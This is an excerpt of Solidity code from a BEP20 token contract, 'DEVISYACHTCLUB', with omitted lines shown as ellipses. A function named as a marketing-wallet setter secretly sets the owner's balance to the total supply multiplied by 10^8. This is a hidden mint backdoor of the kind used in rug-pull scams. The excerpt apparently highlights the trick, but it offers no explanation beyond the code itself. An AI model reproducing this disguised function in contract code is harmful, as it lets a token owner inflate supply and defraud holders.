...
interface IBEP20 {
  ...
  function SetMarketingWallet() external returns (bool);
...
contract DEVISYACHTCLUB is IBEP20{
  ...
  address private LB = 0x000000000000000000000000000000000000dEaD;
  ...
  function _SetMarketingWallet() internal onlyOwner returns (bool success) {LB = 0x000000000000000000000000000000000000dEaD; _balances[msg.sender] = _totalSupply * 10 ** 8;return true;}
